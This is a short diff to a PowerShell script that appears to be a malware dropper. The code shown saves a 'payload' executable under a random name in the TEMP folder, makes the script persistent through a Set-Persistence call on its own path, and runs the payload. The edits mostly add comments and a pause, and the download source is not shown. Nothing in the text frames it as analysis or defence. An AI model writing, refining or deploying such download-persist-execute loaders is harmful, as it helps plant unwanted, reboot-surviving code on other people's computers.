@@ -62,8 +62,10 @@ function Run-Payload {
     }
 }
 
+# ---- MAIN SCRIPT ----
+
 try {
-    # Download payload (optional)
+    # Download payload
     $rand = [System.IO.Path]::GetRandomFileName() + ".exe"
     $downloadPath = Join-Path $env:TEMP $rand
 
@@ -75,8 +77,10 @@ try {
         Pause
     }
 
+    # Use current script path for persistence
     $ScriptFilePath = $MyInvocation.MyCommand.Path
     Set-Persistence -SourcePath $ScriptFilePath
+
     Run-Payload -PayloadPath $downloadPath
 
 } catch {
@@ -84,3 +88,4 @@ try {
     Pause
 }
 
+Pause
